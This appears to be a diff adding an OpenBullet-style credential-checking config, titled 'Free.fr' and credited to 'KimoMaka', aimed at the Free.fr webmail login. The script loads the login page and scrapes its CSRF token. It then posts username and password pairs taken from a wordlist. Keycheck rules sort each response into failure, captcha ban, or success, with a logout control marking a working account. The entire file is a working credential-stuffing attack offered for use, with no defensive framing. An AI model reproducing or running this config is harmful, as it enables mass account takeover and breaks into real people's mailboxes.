@@ -1,0 +1,65 @@
+[SETTINGS]
+{
+  "Name": "Free.fr",
+  "SuggestedBots": 1,
+  "LastModified": "2018-11-30T17:14:30.570681+00:00",
+  "AdditionalInfo": "",
+  "Author": "KimoMaka",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST GET "https://webmail.free.fr/" AutoRedirect=FALSE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Host: webmail.free.fr" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: 154" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "Origin: https://webmail.free.fr" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Referer: https://webmail.free.fr" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9,fr;q=0.8" 
+PARSE "<SOURCE>" CSS "[name=_token]" "value" 0 -> VAR "TOKEN" "" "" 
+REQUEST POST "https://webmail.free.fr/" AutoRedirect=TRUE 
+  CONTENT "_token=<TOKEN>&_task=login&_action=login&_timezone=Africa%2FLagos&_url=_task%3Dlogin&_user=<USER>&_pass=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Host: webmail.free.fr" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: 154" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "Origin: https://webmail.free.fr" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Referer: https://webmail.free.fr" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9,fr;q=0.8" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "<h5><b>Vous pouvez toujours profiter du <a class=\"thumbnail\" href=\"#thumb\"" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Ban OR 
+    KEY "captcha" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Success OR 
+    KEY "rcmail.command('switch-task','logout',this,event)" 
